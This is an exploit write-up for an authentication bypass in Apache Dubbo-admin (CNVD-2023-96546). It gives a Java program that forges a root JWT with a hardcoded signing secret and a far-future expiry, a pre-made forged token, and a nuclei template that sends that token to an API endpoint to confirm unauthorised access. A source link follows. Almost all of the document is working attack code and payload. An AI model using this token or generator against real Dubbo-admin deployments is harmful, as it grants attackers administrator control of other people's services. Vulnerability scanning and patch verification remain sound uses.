## Apache Dubbo-admin-authorized-bypass (CNVD-2023-96546)


## exp
```java
package org.apache.dubbo.admin.controller;

import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class jwt {
    public static String generateToken(String rootUserName) {
        String secret = "86295dd0c4ef69a1036b0b0c15158d77";
        Long timeStamp = 9999999999999L;
        Date date = new Date(timeStamp);
        final SignatureAlgorithm defaultAlgorithm = SignatureAlgorithm.HS512;
        Map<String, Object> claims = new HashMap<>(1);
        claims.put("sub", rootUserName);
        return Jwts.builder()
                .setClaims(claims)
                .setExpiration(date)
                .setIssuedAt(new Date(System.currentTimeMillis()))
                .signWith(defaultAlgorithm, secret)
                .compact();
    }
    public static void main(String[] args) {
        String root = jwt.generateToken("root");
        System.out.println(root);


    }
}
```

## nuclei
```
id: dubbo-admin_Unauthorized_bypass
info:
  name: Template Name
  author: 
  severity: medium
  description: dubbo-admin Unauthorized access bypass
  reference:
    - https://
  tags: apache,dubbo-admin
requests:
  - raw:
      - |+
        GET /api/dev/consumers HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/plain, */*
        Authorization: eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjk5OTk5OTk5OTksInN1YiI6InJvb3QiLCJpYXQiOjE2OTkwODM2Mzd9.wKRqJkWxr_nVDcVVF5rniqhnACtqaDnYUUu55g-atkIwRIt1A-SMpKqBN5zrGZl4kFVcrjzMvXsYqfqf0N9Gbg
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
        Referer: http://{{Hostname}}/
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers:
      - type: word
        part: header
        words:
          - 'HTTP/1.1 200 '
```

## 漏洞来源
- https://mp.weixin.qq.com/s/Wsdx_qi1PeiDwbF_YadoOQ
